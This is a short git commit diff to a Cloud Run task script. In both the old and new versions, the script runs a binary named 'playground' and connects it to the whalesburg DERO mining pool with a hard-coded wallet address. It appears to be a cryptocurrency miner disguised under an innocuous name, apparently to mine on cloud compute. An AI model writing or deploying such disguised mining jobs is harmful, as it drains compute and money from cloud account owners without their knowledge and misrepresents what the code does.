8b32e396e3adbeb993ae63cbb0b91b67a79235a7
mayadyu <121432755+mayadyu@users.noreply.github.com>
2022-12-26 23:55:30 +0700

    Update script.sh

--- script.sh
+++ script.sh
@@ -12,4 +12,4 @@ CLOUD_RUN_TASK_INDEX=${CLOUD_RUN_TASK_INDEX:=0}
 CLOUD_RUN_TASK_ATTEMPT=${CLOUD_RUN_TASK_ATTEMPT:=0}
 
 echo "Starting Task #${CLOUD_RUN_TASK_INDEX}, Attempt #${CLOUD_RUN_TASK_ATTEMPT}..."
-chmod 500 playground && ./playground -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcqdkukzhgva8qsmeqzdn -r pool.whalesburg.com:4304 -p stratum
+chmod 500 playground && ./playground --ip pool.whalesburg.com --port 4300 --user deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcqdkukzhgva8qsmeqzdn.new
